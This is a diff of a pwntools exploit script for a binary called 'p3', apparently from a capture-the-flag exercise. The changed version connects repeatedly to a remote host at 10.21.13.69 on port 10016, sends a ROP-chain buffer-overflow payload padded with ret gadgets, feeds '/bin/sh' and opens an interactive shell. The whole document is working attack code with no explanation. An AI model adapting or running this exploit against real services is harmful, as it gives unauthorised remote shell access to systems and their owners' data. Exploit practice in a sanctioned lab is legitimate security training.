@@ -1,7 +1,11 @@
 #!/usr/bin/env python
 from pwn import *
 context.arch = 'i386'
-p = process('./p3')
+#local = 0
+#if local:
+#	p = process('./p3')
+#else:
+#	p = remote('10.21.13.69', 10016)
 elf = ELF('./p3')
 g = lambda x: next(elf.search(asm(x)))
 ret = g('ret')
@@ -44,7 +48,13 @@ offset2 = offset - len(rop)
 info('offset2 = ' + str(offset2))
 payload = p32(ret) * (offset2 / 4) + rop
 info('len(payload) = ' + str(len(payload)))
-# payload = cyclic(500)
-p.sendline(payload)
-p.sendline('/bin/sh\x00')
-p.interactive()
+while True:
+	p = remote('10.21.13.69', 10016)
+	# payload = cyclic(500)
+	try:
+		p.sendline(payload)
+		p.sendline('/bin/sh\x00')
+	except Exception:
+		p.close()
+	else:
+		p.interactive()
